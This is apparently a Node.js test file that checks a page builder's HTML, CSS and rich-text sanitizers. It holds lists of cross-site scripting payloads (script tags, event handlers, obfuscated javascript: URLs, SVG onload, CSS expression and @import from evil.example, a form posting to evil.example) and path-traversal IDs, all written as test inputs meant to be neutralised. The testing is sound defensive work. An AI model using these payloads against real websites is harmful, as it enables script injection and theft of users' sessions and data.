// Security tests for the page builder's HTML/CSS cleaning. Run: node src/page-builder.test.js
const assert = require('assert');
const path = require('path');
const { cleanHtml, cleanCss, readCatalog, cleanDocHtml, DOC_ID_RE } = require('./page-builder');
const catalog = readCatalog(path.join(__dirname, '../public/components'));
let pass = 0, fail = 0;
const t = (name, fn) => { try { fn(); pass++; console.log('PASS ', name); } catch (e) { fail++; console.log('FAIL ', name, '—', e.message); } };
const A = h => cleanHtml(h, { role: 'admin', catalog }).html;
const P = h => cleanHtml(h, { role: 'pages', catalog }).html;
const bad = /<script|onerror|onclick|onload|javascript:|<iframe|<object|<embed|<svg|srcdoc|<style|<form/i;

const attacks = [
  '<script>alert(1)</script>',
  '<img src=x onerror="alert(1)">',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<div onclick="alert(1)">x</div>',
  '<iframe src="https://evil.example/"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<svg><script>alert(1)</script></svg>',
  '<object data="x"></object><embed src="x">',
  '<style>body{}</style>',
  '<form action="https://evil.example"><input name=p></form>',
  '<ada-countdown title="<img src=x onerror=alert(1)>"></ada-countdown>',
  '<ada-countdown title="x" onfocus="alert(1)" autofocus></ada-countdown>',
  '<ada-sysmon accent="red);background:url(javascript:alert(1)"></ada-sysmon>',
  '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
  '<p style="background:url(javascript:alert(1))">x</p>',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
];
for (const role of ['admin', 'pages']) {
  const C = role === 'admin' ? A : P;
  attacks.forEach((a, i) => t(`${role}: attack ${i + 1} neutralised  ${a.slice(0, 50)}`, () => {
    const out = C(a);
    assert(!bad.test(out), 'got: ' + out);
    assert(!/title="[^"]*&lt;/.test(out) && !/<img[^>]*data:/i.test(out), 'got: ' + out);
  }));
}

t('admin: allowed YouTube iframe kept', () => assert(/<iframe src="https:\/\/www\.youtube\.com\/embed\/x"/.test(A('<iframe src="https://www.youtube.com/embed/x"></iframe>'))));
t('pages: no iframes at all', () => assert(!/<iframe/.test(P('<iframe src="https://www.youtube.com/embed/x"></iframe>'))));
t('admin: normal page survives', () => {
  const h = '<section id="i1" class="px-6 py-20"><h1 class="text-4xl">Hi</h1><p>Text <a href="https://x.com" target="_blank">link</a></p><img src="/media/page-a/p.webp" alt="p"></section>';
  const out = A(h);
  assert(/<h1 class="text-4xl">Hi<\/h1>/.test(out) && /rel="noopener noreferrer"/.test(out) && /<img src="\/media\/page-a\/p.webp"/.test(out), out);
});
t('admin: widget with settings survives', () => assert.strictEqual(A('<ada-sysmon id="w1" theme="neon" accent="rose" style="height:260px"></ada-sysmon>'), '<ada-sysmon id="w1" theme="neon" accent="rose" style="height:260px"></ada-sysmon>'));
t('admin: unknown widget attribute dropped', () => assert(!/bogus/.test(A('<ada-sysmon bogus="1"></ada-sysmon>'))));
t('pages: allowed widget kept, admin-only widget dropped', () => {
  const out = P('<ada-weather theme="glass"></ada-weather><ada-script-runner script-id="x"></ada-script-runner><ada-chat></ada-chat>');
  assert(/<ada-weather theme="glass">/.test(out) && !/script-runner|ada-chat/.test(out), out);
});
t('pages: Todo attribute settings kept', () => assert(/show-today="false"/.test(P('<ada-todo show-today="false"></ada-todo>'))));
t('style: only safe layout properties kept', () => {
  const out = A('<div style="height:10px;position:fixed;background:red">x</div>');
  assert(/height:10px/.test(out) && !/position|background/.test(out), out);
});

const cssAttacks = ['</style><script>alert(1)</script>', '@import url(https://evil.example/x.css);', 'a{background:url(javascript:alert(1))}',
  'a{width:expression(alert(1))}', 'a{behavior:url(x.htc)}', 'a{-moz-binding:url(x)}', 'a{background:url(http://plain.example/x.png)}'];
cssAttacks.forEach((c, i) => t(`css attack ${i + 1} neutralised  ${c.slice(0, 40)}`, () => {
  const out = cleanCss(c).css;
  assert(!/<|@import|javascript:|expression\(|behavior|binding|http:\/\//i.test(out), 'got: ' + out);
}));
t('css: normal rules and https/media urls kept', () => {
  const out = cleanCss('#i1{padding:10px;background:url("https://cdn.example/a.png")} .b{background:url(/media/page-a/x.webp)}').css;
  assert(/padding:10px/.test(out) && /url\("https:\/\/cdn.example\/a.png"\)/.test(out) && /url\("\/media\/page-a\/x.webp"\)/.test(out), out);
});
t('catalog lists widgets and sections', () => assert(catalog.some(c => c.tag === 'ada-sysmon') && catalog.some(c => c.kind === 'section'), JSON.stringify(catalog.slice(0, 3))));

// --- Document widget rich text (Quill HTML) ---
const D = h => cleanDocHtml(h);
['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<a href="javascript:alert(1)">x</a>', '<p onclick="x">x</p>',
 '<iframe src="https://x"></iframe>', '<p style="background:url(javascript:alert(1))">x</p>', '<p class="evil">x</p>', '<svg onload=alert(1)>',
 '<img src="data:image/png;base64,AAAA">', '<span style="color:expression(alert(1))">x</span>'].forEach((a, i) =>
  t(`doc: attack ${i + 1} neutralised  ${a.slice(0, 40)}`, () => {
    const out = D(a);
    assert(!/<script|onerror|onclick|onload|javascript:|<iframe|<svg|expression|data:image|class="evil"/i.test(out), 'got: ' + out);
  }));
t('doc: Quill formatting survives', () => {
  const h = '<h2 class="ql-align-center">T</h2><p><strong>b</strong> <em>i</em> <u>u</u> <s>s</s> <span class="ql-font-serif ql-size-large" style="color: rgb(230, 0, 0); background-color: #ffff00;">c</span></p>'
    + '<ol><li data-list="bullet" class="ql-indent-1">x</li><li data-list="checked">y</li></ol><blockquote>q</blockquote>'
    + '<div class="ql-code-block-container"><div class="ql-code-block">code</div></div><p><a href="https://x.com" target="_blank">l</a><img src="/media/a.webp"></p>';
  const out = D(h);
  for (const want of ['class="ql-align-center"', 'ql-font-serif', 'color:rgb(230, 0, 0)', 'background-color:#ffff00', 'data-list="checked"', 'ql-indent-1', 'ql-code-block', 'rel="noopener noreferrer"', 'src="/media/a.webp"', '<blockquote>'])
    assert(out.includes(want), 'missing ' + want + ' in ' + out);
});
t('doc ids: paths refused', () => { for (const bad of ['../x', '..%2Fx', 'a/b', '', 'x'.repeat(65)]) assert(!DOC_ID_RE.test(bad), bad); assert(DOC_ID_RE.test('doctest-1') && DOC_ID_RE.test('old_11')); });

console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
